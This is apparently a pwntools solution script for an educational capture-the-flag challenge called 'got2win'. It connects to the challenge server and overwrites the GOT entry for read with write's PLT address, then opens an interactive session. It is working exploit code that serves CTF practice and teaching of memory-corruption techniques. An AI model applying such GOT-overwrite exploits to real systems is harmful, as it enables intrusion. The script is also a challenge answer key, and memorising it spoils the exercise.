from pwn import *


# # for debugging
# r = process('./got2win')


# for answering the question
r = remote('edu-ctf.zoolab.org', 10004)

read_got = 0x404038
write_plt = 0x4010c0

s = r.sendlineafter('Overwrite addr: ', str(read_got))
print(s)
s = r.sendafter('Overwrite 8 bytes value: ', p64(write_plt))
print(s)


r.interactive()
